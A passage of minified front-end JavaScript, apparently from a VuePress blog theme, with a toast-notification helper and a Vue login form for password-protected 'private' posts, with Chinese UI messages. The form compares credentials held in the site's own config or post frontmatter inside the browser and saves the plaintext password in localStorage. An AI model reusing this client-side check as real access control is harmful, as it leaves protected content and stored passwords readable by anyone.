Date).getTime(),o=0==a.length?0:a[a.length-1].getAttribute("data-top"),s=parseInt(o)+(0!=a.length?a[a.length-1].offsetHeight+17:t);let l=document.createElement("div");l.className=`private-tip tip-${e} ${i}`,l.style.top=parseInt(o)+"px",l.setAttribute("data-top",s),"info"==e||1==e?l.innerHTML=`<i class="iconfont icon-info icon"></i><p class="tip-info-content">${n}</p>`:"success"==e||2==e?l.innerHTML=`<i class="iconfont icon-dagouyouquan icon"></i><p class="tip-success-content">${n}</p>`:"danger"==e||3==e?l.innerHTML=`<i class="iconfont icon-cuowu icon"></i><p class="tip-danger-content">${n}</p>`:"warning"!=e&&4!=e||(l.innerHTML=`<i class="iconfont icon-gantanhao icon"></i><p class="tip-warning-content">${n}</p>`),document.body.appendChild(l);let c=document.getElementsByClassName(i)[0];setTimeout(()=>{c.style.top=parseInt(s)+"px",c.style.opacity="1"},10),setTimeout(()=>{c.style.top="0px",c.style.opacity="0";var n=function(n){for(var e=[],t=n;t;t=t.nextSibling)1===t.nodeType&&t!==n&&e.push(t);return e}(c);for(let r=0;r<n.length;r++){var e=n[r],t=parseInt(e.getAttribute("data-top"))-e.offsetHeight-17;e.setAttribute("data-top",t),e.style.top=t+"px"}setTimeout(()=>{c.remove()},500)},r)}var a={data:()=>({username:"",password:""}),created(){document.onkeyup=n=>{13==window.event.keyCode&&this.login()}},methods:{login(){let{username:n,password:e,expire:t,loginKey:a}=this.$themeConfig.privatePage;if(this.username&&this.password)if(this.$route.query.singlePage&&this.$filterPosts.forEach(r=>{if(r.path==this.$route.query.toPath)return n=r.frontmatter.username,e=r.frontmatter.password,a=r.frontmatter.title,void(t=r.frontmatter.expire||t)}),this.username==n&&this.password==e){const n=JSON.stringify({username:this.username,password:this.password,time:(new Date).getTime(),expire:t});window.localStorage.setItem(a,n),r("登录成功，正在跳转 ...","success"),this.$route.query.toPath?this.$router.push({path:this.$route.query.toPath}):this.$router.push({path:"/"})}else this.password="",r("用户名或者密码错误！请联系博主获取用户名和密码！","danger");else""==this.username&&""!=this.password?r("用户名不能为空！","warning"):""!=this.username&&""==this.password?r("密码不能为空！","warning"):r("您访问的文章是私密文章，请先输入用户名和密码！","info")}}},i=(t(245),t(0)),o=Object(i.a)(a,(function(){var n=this,e=n._self._c;return e("div",{staticClass:"login-form"},[e("div",{staticClass:"form-header"},[n._v("用户名")]),n._v(" "),e("div",[e("input",{directives:[{name:"model",rawName:"v-model",value:n.username,expression:"username"}],staticClass:"form-control",attrs:{type:"text",placeholder:"请输入用户名 ..."},domProps:{value:n.username},on:{input:function(e){e.target.composing||(n.username=e.target.value)}}})]),n._v(" "),e("div",{staticClass:"form-header"},[n._v("密码")]),n._v(" "),e("div",[e("input",{directives:[{name:"model",rawName:"v-model",value:n.password,expression:"password"}],staticClass:"form-control",attrs:{type:"password",placeholder:"请输入密码 ..."},domProps:{value:n.password},on:{input:function(e){e.target.composing||(n.password=e.target.value)}}})]),n._v(" "),e("div",{staticClass:"btn-row"},[e("button",{staticClass:"btn",on:{click:n.login}},[n._v("登录")])])])}),[],!1,null,null,null);e.default=o.exports}]);